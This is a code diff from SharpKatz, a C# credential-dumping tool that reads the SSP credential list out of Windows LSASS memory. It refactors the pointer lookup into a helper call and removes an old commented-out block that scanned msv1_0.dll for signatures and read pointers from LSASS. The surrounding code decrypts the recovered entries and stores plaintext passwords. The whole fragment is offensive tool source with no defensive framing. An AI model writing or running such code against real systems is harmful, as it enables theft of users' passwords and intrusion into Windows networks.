@@ -30,43 +30,10 @@ namespace SharpKatz.Module
         public static unsafe int FindCredentials(IntPtr hLsass, IntPtr msvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
             KIWI_SSP_CREDENTIAL_LIST_ENTRY entry;
-            long sspCredentialListSignOffset, sspCredentialListOffset;
             IntPtr sspCredentialListAddr;
-            IntPtr msvLocal;
             IntPtr llCurrent;
             string passDecrypted = "";
-            /*
-            // Load wdigest.dll locally to avoid multiple ReadProcessMemory calls into lsass
-            msvLocal = Natives.LoadLibrary("msv1_0.dll");
-            if (msvLocal == IntPtr.Zero)
-            {
-                Console.WriteLine("[x] Ssp Error: Could not load msv1_0.dll into local process");
-                return 1;
-            }
-            //Console.WriteLine("[*] Ssp  Loaded msv1_0.dll at address {0:X}", msvLocal.ToInt64());
-
-            byte[] tmpbytes = new byte[max_search_size];
-            Marshal.Copy(msvLocal, tmpbytes, 0, (int)max_search_size);
-
-            // Search for SspCredentialList signature within wdigest.dll and grab the offset
-            sspCredentialListSignOffset = (long)Utility.SearchPattern(tmpbytes, oshelper.SspCredentialListSign);
-            if (sspCredentialListSignOffset == 0)
-            {
-                Console.WriteLine("[x] Ssp  Error: Could not find SspCredentialList signature\n");
-                return 1;
-            }
-            //Console.WriteLine("[*] Ssp  SspCredentialList offset found as {0}", sspCredentialListSignOffset);
-
-            // Read memory offset to SspCredentialList from a "RAX,qword ptr [SspCredentialList]" asm
-            IntPtr tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + oshelper.CREDENTIALLISTOFFSET);
-            byte[] sspCredentialListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 4);
-            sspCredentialListOffset = BitConverter.ToInt32(sspCredentialListOffsetBytes, 0);
-
-            // Read pointer at address to get the true memory location of SspCredentialList
-            tmp_p = IntPtr.Add(msvMem, (int)sspCredentialListSignOffset + oshelper.CREDENTIALLISTOFFSET + sizeof(int) + (int)sspCredentialListOffset);
-            byte[] sspCredentialListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
-            sspCredentialListAddr = new IntPtr(BitConverter.ToInt64(sspCredentialListAddrBytes, 0));
-            */
+            
             sspCredentialListAddr = Utility.GetListAdress(hLsass, msvMem, "msv1_0.dll", max_search_size, oshelper.CREDENTIALLISTOFFSET, oshelper.SspCredentialListSign);
 
             //Console.WriteLine("[*] Ssp  SspCredentialList found at address {0:X}", sspCredentialListAddr.ToInt64());
@@ -117,8 +84,7 @@ namespace SharpKatz.Module
                     {
                         sspentry.DomainName = "[NULL]";
                     }
-
-                    // Check if password is present
+                    
                     if (!string.IsNullOrEmpty(passDecrypted))
                     {
                         sspentry.Password = passDecrypted;
